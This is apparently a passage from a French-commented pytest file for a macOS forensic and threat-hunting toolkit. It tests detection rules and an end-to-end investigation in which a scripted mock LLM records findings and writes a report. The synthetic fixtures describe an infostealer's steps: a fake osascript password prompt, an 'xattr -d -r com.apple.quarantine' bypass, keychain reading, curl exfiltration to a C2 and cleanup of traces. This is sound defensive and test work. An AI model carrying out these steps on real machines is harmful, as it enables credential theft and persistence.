              for i in range(60)]
    wiped = [(f'/Users/a/Projects/file{i}.txt', 500 + i, builder.REMOVED | builder.IS_FILE, 1000 + i)
             for i in range(210)]
    unknown = [('/Library/LaunchDaemons/net.evil.helper.plist', 900, builder.CREATED | builder.IS_FILE, 9)]
    res = _hunt(_write(tmp_path / 'fse', builder.fsevents_bytes(ransom + wiped + unknown)))
    rename = _by_rule(res, 'fsevents_mass_rename')[0]
    assert rename['mitre'] == 'T1486' and rename['extension'] == '.locked' and rename['count'] == 60
    assert len(rename['refs']) == 30  # refs bornees (MAX_REFS), toutes citables
    removal = _by_rule(res, 'fsevents_mass_removal')[0]
    assert removal['mitre'] == 'T1485' and removal['severity'] == 'medium'
    created = _by_rule(res, 'fsevents_launch_item_created')[0]
    assert created['severity'] == 'low' and created['mitre'] == 'T1543.004'
    assert _hunt(os.path.join(BENIGN, '00000000007a0021'))['findings'] == []


# ============================================================================
# MITRE ATT&CK : identifiants utilises
# ============================================================================

def test_techniques_mitre_connues():
    source = open(rules.__file__, encoding='utf-8').read()
    used = set(re.findall(r'T\d{4}(?:\.\d{3})?', source))
    assert used <= set(rules.MITRE_NAMES), used - set(rules.MITRE_NAMES)
    assert 'T1547.011' not in used  # Plist Modification : technique depreciee (remplacee par T1647)


# ============================================================================
# References de preuve : indexees, citables, persistantes
# ============================================================================

@pytest.mark.parametrize('key', ['quarantine', 'tcc', 'log', 'agent', 'fsevents'])
def test_refs_des_constats_valides(tmp_path, key):
    case = tmp_path / 'cas'
    case.mkdir()
    target = case / os.path.basename(ST[key])
    shutil.copy(ST[key], target)
    toolkit.set_active_case(str(case))
    parsed = toolkit.run_tool(PARSER[key], {'file_path': str(target)})
    assert not parsed.get('error') and parsed['indexed_events'] == parsed['total_events']
    res = toolkit.run_tool('macos_hunt', {'file_path': str(target)})
    refs = [r for f in res['findings'] for r in f['refs']]
    assert refs and all(r['artifact'] == target.name for r in refs)
    valid, invalid = toolkit.validate_refs(refs, str(case))
    assert not invalid and len(valid) == len(refs)
    toolkit.reset_evidence_index()  # redemarrage : la base du cas suffit
    valid, invalid = toolkit.validate_refs(refs, str(case))
    assert not invalid
    bogus = [{'artifact': target.name, 'kind': refs[0]['kind'], 'value': 999999}]
    assert toolkit.validate_refs(bogus, str(case))[1]
    assert toolkit.compute_tool_coverage(str(case))['gaps'] == []
    assert {PARSER[key], 'macos_hunt'} <= {s['tool'] for s in evidence_db.sources(str(case))['sources']}


def test_couverture_exige_parser_et_detection(tmp_path):
    case = tmp_path / 'cas'
    case.mkdir()
    shutil.copy(ST['tcc'], case / 'TCC_system')
    toolkit.set_active_case(str(case))
    gaps = toolkit.compute_tool_coverage(str(case))['gaps']
    assert {g['step'] for g in gaps} == {'parsing macOS (tcc)', 'detection macOS'}
    toolkit.run_tool('macos_parse_tcc', {'file_path': str(case / 'TCC_system')})
    hits = evidence_db.timeline(str(case), contains='helperd')
    assert hits['total_events'] == 1 and hits['events'][0]['ref']['kind'] == 'row'


# ============================================================================
# Suite d'evaluation : cas annotes, techniques attendues, reproductibilite
# ============================================================================

def test_suite_macos_annotee():
    cases = {name: truth for name, _d, truth in evaluation.load_suite(SUITE)}
    assert {'macos_launchagent_infostealer', 'macos_benign_admin'} <= set(cases)
    stealer, benign = cases['macos_launchagent_infostealer'], cases['macos_benign_admin']
    assert stealer['techniques'] and len(stealer['facts']) == 4 and benign['benign']
    for case_dir in (STEALER, BENIGN):
        for name in os.listdir(case_dir):
            assert os.path.getsize(os.path.join(case_dir, name)) < 64 * 1024, name
    found = set()
    for path in ST.values():
        found |= _techniques(_hunt(path))
    for tech in stealer['techniques']:
        assert evaluation.technique_matches(tech, found), (tech, found)
    for tech in stealer['forbidden_techniques']:
        assert not evaluation.technique_matches(tech, found), tech
    benign_found = set()
    for name in os.listdir(BENIGN):
        if name != evaluation.GROUND_TRUTH:
            res = _hunt(os.path.join(BENIGN, name))
            assert res['findings'] == [], (name, res['findings'])
            benign_found |= _techniques(res)
    assert not any(evaluation.technique_matches(t, benign_found) for t in benign['forbidden_techniques'])


def test_builder_reproductible(tmp_path):
    builder.main(['-o', str(tmp_path)])
    for case in ('macos_launchagent_infostealer', 'macos_benign_admin'):
        produced = sorted(os.listdir(tmp_path / case))
        assert produced == sorted(os.listdir(os.path.join(SUITE, case)))
        for name in produced:
            with open(tmp_path / case / name, 'rb') as a, open(os.path.join(SUITE, case, name), 'rb') as b:
                built, shipped = a.read(), b.read()
            if built.startswith(b'SQLite format 3\x00'):
                # L'en-tete SQLite porte la version de la bibliotheque qui a ecrit le fichier
                # et la disposition des pages peut varier : comparer le contenu logique.
                assert _sqlite_dump(tmp_path / case / name) == _sqlite_dump(os.path.join(SUITE, case, name)), \
                    (case, name)
            elif built.startswith(b'\x1f\x8b'):
                # L'en-tete gzip porte l'octet 'OS' qui depend de la version de Python : comparer le contenu.
                assert gzip.decompress(built) == gzip.decompress(shipped), (case, name)
            else:
                assert built == shipped, (case, name)


def _sqlite_dump(path):
    conn = sqlite3.connect(f'file:{path}?mode=ro', uri=True)
    try:
        return list(conn.iterdump())
    finally:
        conn.close()


# ============================================================================
# Bout en bout : enquete a cinq phases sur le cas voleur d'informations
# ============================================================================

REPORT = f"""# Voleur d'informations macOS sur MBP-ALICE
## Resume executif
alice a telecharge InvoiceViewer_2026.dmg depuis {builder.PHISH_ORIGIN} (invoice-viewer-cdn.top), leve la
quarantaine avec xattr, saisi son mot de passe dans une fausse invite osascript. Le binaire cache
{HELPER} a recu kTCCServiceSystemPolicyAllFiles (Full Disk Access) et persiste par le LaunchAgent
{LABEL}. Donnees envoyees a {builder.C2} puis dossier /private/tmp/.zz efface.
## Chronologie
- 2026-10-14T09:02:11Z telechargement (quarantaine row 3)
- 09:04:30Z xattr -d -r com.apple.quarantine ; 09:05:02Z invite osascript ; 09:05:40Z trousseau
- 09:06:10Z TCC Full Disk Access ; 09:06:30Z LaunchAgent charge ; 09:07:15Z exfiltration curl
## Indicateurs de compromission (IoC)
- invoice-viewer-cdn.top
- {HELPER}
- {builder.C2}
## Mapping MITRE ATT&CK
T1204.002, T1553.001, T1059.002, T1056.002, T1555.001, T1548.006, T1543.001, T1564.001, T1036.005, T1041,
T1070.004
## Conclusions
Poste compromis par un voleur d'informations.
## Recommandations
Isoler le poste, supprimer le LaunchAgent {LABEL}, reinitialiser les mots de passe, bloquer {builder.C2}.
"""


def _call(name, args):
    return {'tool_calls': [{'id': name, 'type': 'function',
                            'function': {'name': name, 'arguments': json.dumps(args)}}]}


def _refs(path, rule):
    kind = mf.detect(path)['type']
    findings, _alerts, _notes = rules.run(kind, macos._load_for_hunt(path, kind), os.path.basename(path))
    return next(f for f in findings if f['rule'] == rule)['refs'][:3]


class MacCaseLLM:
    def __init__(self, **kwargs):
        self.usage = {'prompt_tokens': 0, 'completion_tokens': 0, 'total_tokens': 0, 'calls': 0}
        self.step = {}

    def chat(self, messages, tools=None, model=None):
        self.usage['calls'] += 1
        if tools is None or 'verificateur' in messages[0]['content']:
            return {'content': 'fin'}
        prompt = messages[1]['content']
        phase = int(prompt.split('PHASE ', 1)[1][0])
        case = prompt.split('Dossier du cas : ', 1)[1].split('\n', 1)[0].strip()
        n = self.step.get(phase, 0)
        self.step[phase] = n + 1
        art = {k: os.path.join(case, os.path.basename(p)) for k, p in ST.items()}

        def finding(title, mitre, key, rule, severity='high'):
            return _call('record_finding', {'case_dir': case, 'title': title, 'severity': severity, 'mitre': mitre,
                                            'evidence': os.path.basename(art[key]), 'confidence': 'confirmed',
                                            'evidence_refs': _refs(art[key], rule)})
        extraction = [_call('macos_detect_artifact', {'file_path': art['log']})]
        for key, path in art.items():
            extraction += [_call(PARSER[key], {'file_path': path}), _call('macos_hunt', {'file_path': path})]
        extraction.append(_call('audit_tool_coverage', {'case_dir': case}))
        findings = [
            finding('Telechargement depuis invoice-viewer-cdn.top', 'T1204.002', 'quarantine',
                    'quarantine_suspicious_origin'),
            finding('Quarantaine levee par xattr', 'T1553.001', 'log', 'ul_quarantine_removal'),
            finding('Fausse invite de mot de passe osascript', 'T1059.002,T1056.002', 'log', 'ul_password_prompt'),
            finding('Lecture du trousseau Chrome', 'T1555.001', 'log', 'ul_keychain_access'),
            finding('Acces complet au disque pour helperd', 'T1548.006,T1564.001', 'tcc', 'tcc_grant_user_writable',
                    'critical'),
            finding(f'LaunchAgent {LABEL} lancant un binaire cache', 'T1543.001,T1564.001', 'agent',
                    'launchd_hidden_binary'),
            finding(f'Label {LABEL} usurpant Apple', 'T1036.005', 'agent', 'launchd_apple_masquerade'),
            finding(f'Exfiltration vers {builder.C2}', 'T1041', 'log', 'ul_curl_upload'),
            finding('Dossier /private/tmp/.zz efface', 'T1070.004', 'fsevents', 'fsevents_staging_cleanup',
                    'medium'),
        ]
        script = {
            1: [_call('list_artifacts', {'case_dir': case}),
                _call('set_investigation_plan', {'case_dir': case, 'steps': ['Telechargements', 'Persistance',
                                                                             'TCC', 'Journal unifie']})],
            2: extraction,
            3: findings,
            4: [_call('challenge_finding', {'case_dir': case, 'finding_id': i, 'verdict': 'upheld',
                                            'alternative': 'Installation legitime',
                                            'rationale': 'Origine .top, binaire cache, TCC ecrit directement.'})
                for i in range(1, 9)] + [_call('audit_tool_coverage', {'case_dir': case}),
                                         _call('audit_evidence_coverage', {'case_dir': case})],
            5: [_call('save_report', {'case_dir': case, 'title': 'Infostealer macOS', 'markdown': REPORT})],
        }[phase]
        return script[n] if n < len(script) else {'content': 'phase terminee'}


def test_enquete_macos_bout_en_bout(monkeypatch):
    monkeypatch.setattr(phases, 'CopilotClient', MacCaseLLM)
    monkeypatch.delenv('PHOENIX_INVESTIGATION_MODE', raising=False)
    report = evaluation.run_suite(SUITE, only=['macos_launchagent_infostealer'], mode='phased')
    case = report['cases'][0]
    assert 'error' not in case, case
    sc = case['score']
    assert sc['technique_recall'] == 1.0 and sc['ioc_recall'] == 1.0, sc
    assert sc['fact_exact'] == 1.0, sc['facts']
    assert sc['passed'], sc
    assert not os.path.exists(os.path.join(STEALER, memory.STATE_FILENAME))
